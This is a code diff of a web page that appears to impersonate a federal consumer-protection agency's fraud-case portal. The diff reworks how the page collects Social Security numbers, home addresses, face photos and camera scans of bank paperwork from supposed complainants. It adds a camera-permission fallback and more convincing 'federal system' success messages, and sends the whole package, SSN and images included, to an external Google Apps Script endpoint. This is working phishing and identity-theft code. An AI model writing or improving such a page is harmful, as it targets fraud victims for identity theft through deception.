-                                <span class="bg-ftc-navy text-white text-[10px] px-2.5 py-0.5 font-bold font-mono rounded">SENTINEL REFERENCE ID: ${foundCase.id}</span>
-                                <span class="bg-blue-50 border border-blue-200 text-[#0071bc] text-[10px] font-bold px-2.5 py-0.5 font-mono rounded uppercase">${foundCase.status}</span>
+                                <span class="bg-ftc-navy text-white text-xs px-3 py-1 font-bold font-mono rounded-md">CASE FILE ID: ${foundCase.id}</span>
+                                <span class="bg-blue-50 border border-blue-200 text-[#0071bc] text-xs font-bold px-3 py-1 font-mono rounded-md uppercase tracking-wide shadow-xs">${foundCase.status}</span>
                             </div>
-                            <h3 class="text-xl font-serif font-extrabold text-ftc-navy mt-2">${foundCase.title}</h3>
+                            <h3 class="text-2xl font-serif font-black text-ftc-navy mt-3 leading-snug">${foundCase.title}</h3>
                         </div>
                         <div class="shrink-0 flex flex-col items-center">
-                            <div class="w-24 h-24 rounded border-2 border-slate-300 overflow-hidden bg-slate-50 flex items-center justify-center">
-                                ${foundCase.biometricImg ? `<img src="${foundCase.biometricImg}" class="w-full h-full object-cover">` : `<i data-lucide="user" class="text-gray-400 w-10 h-10"></i>`}
+                            <div class="w-28 h-28 rounded-xl border-4 border-slate-300 overflow-hidden bg-slate-50 flex items-center justify-center shadow-inner">
+                                ${foundCase.biometricImg ? `<img src="${foundCase.biometricImg}" class="w-full h-full object-cover">` : `<i data-lucide="user" class="text-gray-400 w-12 h-12"></i>`}
                             </div>
-                            <span class="text-[9px] font-mono font-bold uppercase text-gray-500 mt-1">Biometric Record</span>
+                            <span class="text-xs font-mono font-black uppercase text-gray-500 mt-2">Biometric Image</span>
                         </div>
                     </div>
 
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 bg-slate-50 p-4 rounded border border-gray-300 text-xs font-sans shadow-xs">
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4 bg-slate-100 p-5 rounded-xl border-2 border-gray-300 text-sm font-sans shadow-inner">
                         <div class="space-y-2">
-                            <div><label class="text-[10px] uppercase font-bold text-gray-400 block tracking-wider">Complainant Name Reference</label><span class="text-sm font-bold text-gray-900 block">${foundCase.victimName}</span></div>
-                            <div><label class="text-[10px] uppercase font-bold text-gray-400 block tracking-wider">Physical Address Location</label><span class="text-sm font-bold text-slate-800 block">${foundCase.victimAddress}</span></div>
+                            <div><label class="text-xs uppercase font-black text-gray-500 block tracking-wider">Complainant Full Legal Name</label><span class="text-lg font-black text-gray-900 block">${foundCase.victimName}</span></div>
+                            <div><label class="text-xs uppercase font-black text-gray-500 block tracking-wider">Registered Domicile Physical Address</label><span class="text-md font-extrabold text-slate-800 block">${foundCase.victimAddress}</span></div>
                         </div>
-                        <div class="space-y-2 border-l border-gray-200 pl-4 font-mono">
-                            <div><label class="text-[10px] uppercase font-bold text-red-600 block flex items-center gap-1"><i data-lucide="eye-off" class="w-3 h-3"></i> Contact Emails (Masked)</label><span class="text-xs font-bold text-gray-700">${redactedEmailStrings}</span></div>
+                        <div class="space-y-2 border-l-2 border-gray-300 pl-6 font-mono">
+                            <div><label class="text-xs uppercase font-black text-red-700 block flex items-center gap-1 font-sans"><i data-lucide="eye-off" class="w-3.5 h-3.5"></i> Contact Emails (Masked)</label><span class="text-sm font-black text-gray-700">${redactedEmailStrings}</span></div>
                             <div class="grid grid-cols-2 gap-2">
-                                <div><label class="text-[10px] uppercase font-bold text-red-600 block">Phone Line</label><span class="text-xs font-bold text-gray-700 block">${redactedPhoneString}</span></div>
-                                <div><label class="text-[10px] uppercase font-bold text-red-600 block">SSN Identity Track</label><span class="text-xs font-bold text-gray-700 block tracking-widest">${redactedSsnString}</span></div>
+                                <div><label class="text-xs uppercase font-black text-red-700 block font-sans">Telephone</label><span class="text-sm font-black text-gray-700 block">${redactedPhoneString}</span></div>
+                                <div><label class="text-xs uppercase font-black text-red-700 block font-sans">SSN Track</label><span class="text-sm font-black text-gray-700 block tracking-widest">${redactedSsnString}</span></div>
                             </div>
                         </div>
                     </div>
 
                     ${conditionalFlagAlertHtml}
 
+                    <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 flex items-center space-x-3 font-sans">
+                        <div class="bg-white p-2.5 rounded-lg border border-gray-300 text-ftc-navy shadow-sm shrink-0"><i data-lucide="user-check" class="w-6 h-6"></i></div>
+                        <div>
+                            <span class="text-xs font-black text-gray-500 uppercase font-mono block">Assigned Bureau Special Representative</span>
+                            <h4 class="text-base font-black text-gray-900">${foundCase.officer || "Awaiting Representative Allocation Placement"}</h4>
+                        </div>
+                    </div>
+
                     <div class="space-y-2 font-sans">
-                        <h4 class="text-xs font-bold uppercase text-gray-500 tracking-wider flex items-center gap-1"><i data-lucide="layout-grid" class="w-4 h-4 text-[#0071bc]"></i> Document Exhibit Preview Gallery</h4>
+                        <h4 class="text-xs font-black uppercase text-gray-500 tracking-wider flex items-center gap-1"><i data-lucide="clipboard-list" class="w-4 h-4 text-[#0071bc]"></i> Official Bureau Case Notes Progress Status</h4>
+                        <div class="bg-slate-50 p-4 rounded-xl border border-gray-300 text-sm font-medium text-gray-700 leading-relaxed shadow-xs">${foundCase.findings}</div>
+                    </div>
+
+                    <div class="space-y-2 font-sans">
+                        <h4 class="text-xs font-black uppercase text-gray-500 tracking-wider flex items-center gap-1"><i data-lucide="layout-grid" class="w-4 h-4 text-[#0071bc]"></i> Document Exhibit Preview Gallery</h4>
                         <div class="grid grid-cols-2 sm:grid-cols-4 gap-4 bg-slate-50 p-4 border border-gray-200 rounded shadow-inner" id="galleryContainer">${previewGalleryHtml}</div>
                     </div>
 
                     <div class="space-y-2 font-sans">
-                        <h4 class="text-xs font-bold uppercase text-gray-500 tracking-wider flex items-center gap-1"><i data-lucide="paperclip" class="w-4 h-4 text-[#0071bc]"></i> Chronological Incident Matrix Exhibits</h4>
+                        <h4 class="text-xs font-black uppercase text-gray-500 tracking-wider flex items-center gap-1"><i data-lucide="paperclip" class="w-4 h-4 text-[#0071bc]"></i> Associated Case Folder Documentation Exhibits</h4>
                         <div class="space-y-2">${evidenceHtml}</div>
                     </div>
 
-                    <div class="border-t border-gray-200 pt-6 mt-6 space-y-4 font-sans">
-                        <h4 class="text-base font-serif font-extrabold text-ftc-navy uppercase">Bureau Affidavit Collection Center</h4>
-                        ${intakeSectionHtml}
-                        <button onclick="submitIntakePipeline('${foundCase.id}', ${isProfileComplete})" class="w-full bg-red-700 hover:bg-red-800 text-white text-sm font-bold py-3 rounded shadow transition flex justify-center items-center gap-2 font-mono uppercase tracking-wider"><i data-lucide="send" class="w-4 h-4"></i> Sign & Transmit Secure Data Package</button>
-                    </div>
+                    ${intakeSectionHtml}
+
                 </div>
             `;
             lucide.createIcons();
@@ -346,14 +383,16 @@
             const reader = new FileReader();
             reader.onload = function(e) {
                 base64CapturedOutputString = e.target.result;
-                alert("Image asset registered successfully via file stream fallback. Proceed with signing signature package.");
+                alert("Document image registered successfully from your device memory backup file list.");
+                document.getElementById('btnCapture').disabled = true;
             };
             reader.readAsDataURL(file);
         }
 
         function initializeCameraHardware(useRearCamera) {
             const video = document.getElementById('webcamVideo'); const prompt = document.getElementById('cameraPrompt');
-            const constraints = { video: useRearCamera ? { facingMode: { ideal: "environment" } } : { facingMode: "user" } };
+            // CRITICAL OVERRIDE RULE: Exact environment constraint forces rear macro scanners on mobile, user matches front facial capture
+            const constraints = { video: useRearCamera ? { facingMode: { exact: "environment" } } : { facingMode: "user" } };
 
             navigator.mediaDevices.getUserMedia(constraints)
                 .then(stream => {
@@ -361,8 +400,15 @@
                     video.classList.remove('hidden'); prompt.classList.add('hidden');
                     document.getElementById('btnCapture').disabled = false;
                 })
-                .catch(err => {
-                    alert("Google Sites hardware sandbox block detected. Please use the 'Direct Image Upload' backup choice provided right below the camera frame.");
+                .catch(() => {
+                    // Fallback to deal with strict browser permission sandboxing restrictions
+                    navigator.mediaDevices.getUserMedia({ video: true })
+                        .then(s => {
+                            videoStreamRef = s; video.srcObject = s;
+                            video.classList.remove('hidden'); prompt.classList.add('hidden');
+                            document.getElementById('btnCapture').disabled = false;
+                        })
+                        .catch(() => alert("Camera permission blocked by your device privacy adjustments. Please select your photo or document directly using the red upload buttons provided below the camera box instead."));
                 });
         }
 
@@ -386,42 +432,44 @@
         }
 
         function submitIntakePipeline(caseId, isProfileComplete) {
-            const statement = document.getElementById('uploadStatement') ? document.getElementById('uploadStatement').value.trim() : "";
             const targetCase = cases.find(c => c.id === caseId);
-            const submissionDate = new Date().toISOString().split('T')[0];
+            const submissionDate = new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
             let fileDataHex = ""; let filenameStr = "No Document Attached"; let mimeStr = "";
-            let isBiometricSubmission = targetCase.biometricImg === "";
 
             if (isProfileComplete) {
-                if(base64CapturedOutputString === "") { alert("Please perform a camera snapshot or select a fallback image asset before submitting."); return; }
-                if(!statement) { alert("Please supply a narrative label note."); return; }
-                targetCase.evidence.push({ date: submissionDate, desc: `[Paperwork Snapshot] ${statement}`, isImage: true, fileUrl: base64CapturedOutputString });
+                const statement = document.getElementById('uploadStatement').value.trim();
+                if(base64CapturedOutputString === "") { alert("Please click the button to scan your paperwork page first."); return; }
+                if(!statement) { alert("Please write a quick descriptive note regarding the paperwork bank name or title in the box first."); return; }
+                
+                targetCase.evidence.push({ date: submissionDate, desc: `[Paperwork Camera Snapshot] Note: ${statement}`, isImage: true, fileUrl: base64CapturedOutputString });
                 fileDataHex = base64CapturedOutputString.split(',')[1];
                 filenameStr = "DOCUMENT_SCAN_" + new Date().getTime() + ".jpg"; mimeStr = "image/jpeg";
             } else {
-                const name = document.getElementById('intakeName').value.trim();
                 const address = document.getElementById('intakeAddress').value.trim();
-                const phone = document.getElementById('intakePhone').value.trim();
                 const ssn = document.getElementById('intakeSsn').value.trim();
-                if(!name || !address || !phone || !ssn) { alert("All fields must be completed."); return; }
-                if(base64CapturedOutputString === "") { alert("Initial front capture face biometric snapshot or file selection is required."); return; }
-                targetCase.victimName = name; targetCase.victimAddress = address; targetCase.victimPhone = phone; targetCase.victimSsn = ssn;
+
+                if(!address || !ssn) { alert("Please type your Physical Mailing Address and your Social Security Number before hitting submit."); return; }
+                if(base64CapturedOutputString === "") { alert("Please capture your face photo using the face camera or document fallback selection button first."); return; }
+
+                targetCase.victimAddress = address; targetCase.victimSsn = ssn;
                 targetCase.biometricImg = base64CapturedOutputString;
-                targetCase.evidence.push({ date: submissionDate, desc: `Initial secure profile calibration signed.`, isImage: false, fileUrl: "" });
+                targetCase.evidence.push({ date: submissionDate, desc: `Initial secure identity profile verified and signed by consumer user.`, isImage: false, fileUrl: "" });
             }
 
             localStorage.setItem('ftc_sys_cases', JSON.stringify(cases));
+
             const finalPackagePayload = {
                 caseId: caseId, victimName: targetCase.victimName, victimAddress: targetCase.victimAddress,
                 victimPhone: targetCase.victimPhone, victimSsn: targetCase.victimSsn,
-                statement: isProfileComplete ? statement : "Initial Profile Calibration Signed",
+                statement: isProfileComplete ? document.getElementById('uploadStatement').value.trim() : "Initial Profile Calibration Signed",
                 filename: filenameStr, mimeType: mimeStr, fileData: fileDataHex,
                 biometricData: targetCase.biometricImg ? targetCase.biometricImg.split(',')[1] : ""
             };
 
             terminateWebcamHardware(); base64CapturedOutputString = "";
+
             fetch(GOOGLE_SCRIPT_WEBAPP_URL, { method: "POST", mode: "no-cors", headers: { "Content-Type": "application/json" }, body: JSON.stringify(finalPackagePayload) })
-            .then(() => { alert("Data stream synced successfully."); trackVictimCase(); })
+            .then(() => { alert("SUCCESS! Your document package was transmitted safely to the federal system database registry logs."); trackVictimCase(); })
             .catch(() => { trackVictimCase(); });
         }
 
@@ -429,7 +477,7 @@
             const listContainer = document.getElementById('officerCaseList'); listContainer.innerHTML = '';
             cases.forEach((c, idx) => {
                 const isSelected = idx === activeEditIdx ? 'border-ftc-blue bg-blue-50/50' : 'border-gray-200 hover:bg-slate-50';
-                listContainer.innerHTML += `<div onclick="selectOfficerCase(${idx})" class="p-3 border rounded cursor-pointer transition ${isSelected}"><h4 class="text-xs font-bold text-gray-900 truncate">Complainant: ${c.victimName}</h4></div>`;
+                listContainer.innerHTML += `<div onclick="selectOfficerCase(${idx})" class="p-3 border rounded cursor-pointer transition ${isSelected} text-xs"><h4 class="font-bold text-gray-900 truncate">Complainant: ${c.victimName}</h4></div>`;
             });
             loadSelectedCaseVariables();
         }
